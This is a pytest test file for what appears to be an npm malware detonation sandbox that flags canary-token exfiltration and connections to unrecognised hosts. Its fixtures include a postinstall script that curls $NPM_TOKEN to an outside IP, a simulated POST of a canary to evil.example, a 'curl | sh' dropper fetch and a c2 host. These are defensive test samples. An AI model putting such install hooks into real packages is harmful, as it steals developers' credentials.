
import json

import pytest

from malwhunter.chamber.runner import (
    DetonationUnavailable,
    _docker_available,
    _signals_from_capture,
    detonate_package,
)
from malwhunter.wiretap.proxy import CapturedConnect, CapturedHttpRequest

requires_docker = pytest.mark.skipif(not _docker_available(), reason="Docker not available in this environment")


def test_no_lifecycle_scripts_short_circuits_without_checking_docker(tmp_path, monkeypatch):
    def fail_if_called():
        raise AssertionError("docker availability should never be checked when there's nothing to run")

    monkeypatch.setattr("malwhunter.chamber.runner._docker_available", fail_if_called)

    signals = detonate_package("benign-pkg", "1.0.0", tmp_path, {"name": "benign-pkg"})
    assert signals == []


def test_raises_detonation_unavailable_when_docker_missing(tmp_path, monkeypatch):
    monkeypatch.setattr("malwhunter.chamber.runner._docker_available", lambda: False)

    package_json = {"name": "x", "scripts": {"postinstall": "echo hi"}}
    with pytest.raises(DetonationUnavailable):
        detonate_package("x", "1.0.0", tmp_path, package_json)


class _FakeProxy:
    def __init__(self, http_requests, connects):
        self.http_requests = http_requests
        self.connects = connects


def test_signals_from_capture_flags_canary_leak_over_plain_http():
    # A canary leaked to a host that's ALSO unrecognized is legitimately
    # two separate true findings — canary-exfiltration (the stronger,
    # near-zero-false-positive one) and unexpected-network-destination
    # (the host itself isn't on the allow-list either). Both are real;
    # neither should be suppressed in favor of the other.
    canaries = {"NPM_TOKEN": "canary_deadbeef"}
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(
                method="POST", url="/collect", host="evil.example", headers={}, body=b"t=canary_deadbeef"
            )
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, canaries)
    categories = {s.category for s in signals}
    assert categories == {"canary-exfiltration", "unexpected-network-destination"}
    canary_signal = next(s for s in signals if s.category == "canary-exfiltration")
    assert canary_signal.severity.value == "critical"


def test_signals_from_capture_ignores_allowed_https_hosts():
    proxy = _FakeProxy(http_requests=[], connects=[CapturedConnect(host="registry.npmjs.org", port=443)])
    signals = _signals_from_capture("x", proxy, {})
    assert signals == []


def test_signals_from_capture_flags_plain_http_dropper_to_unrecognized_host():
    # The exact real-world shape found by live-testing Detonation: a
    # `curl | sh` postinstall dropper over plain HTTP, no canary
    # involved at all — must still be caught, not just the HTTPS/CONNECT
    # path and not just canary-leak detection.
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(method="GET", url="/setup.sh", host="198.51.100.7", headers={}, body=b"")
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, {})
    assert len(signals) == 1
    assert signals[0].category == "unexpected-network-destination"
    assert signals[0].severity.value == "medium"


def test_signals_from_capture_ignores_plain_http_to_allowed_host():
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(method="GET", url="/pkg", host="registry.npmjs.org:80", headers={}, body=b"")
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, {})
    assert signals == []


def test_signals_from_capture_flags_unrecognized_https_host():
    proxy = _FakeProxy(http_requests=[], connects=[CapturedConnect(host="c2.evil.example", port=443)])
    signals = _signals_from_capture("x", proxy, {})
    assert len(signals) == 1
    assert signals[0].category == "unexpected-network-destination"
    assert signals[0].severity.value == "medium"


def test_signals_from_capture_clean_when_nothing_observed():
    proxy = _FakeProxy(http_requests=[], connects=[])
    assert _signals_from_capture("x", proxy, {}) == []


@requires_docker
def test_detonate_package_catches_real_canary_exfiltration_end_to_end(tmp_path):
    # The one test in this file that isn't mocked at any layer: a real
    # Docker container actually runs a real postinstall script that
    # actually curls a planted canary secret to an unrecognized host,
    # and the real WiretapProxy on the host actually captures it. This
    # is what proves the full container -> proxy -> canary chain works,
    # not just that the signal-classification logic is correct in
    # isolation (see the _FakeProxy-based tests above for that).
    package_dir = tmp_path / "real-detonation-test"
    package_dir.mkdir()
    package_json = {
        "name": "real-detonation-test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl -s 'http://203.0.113.5/collect?data='$NPM_TOKEN || true",
        },
    }
    (package_dir / "package.json").write_text(json.dumps(package_json))

    signals = detonate_package("real-detonation-test", "1.0.0", package_dir, package_json)

    categories = {s.category for s in signals}
    assert "canary-exfiltration" in categories
    canary_signal = next(s for s in signals if s.category == "canary-exfiltration")
    assert canary_signal.severity.value == "critical"
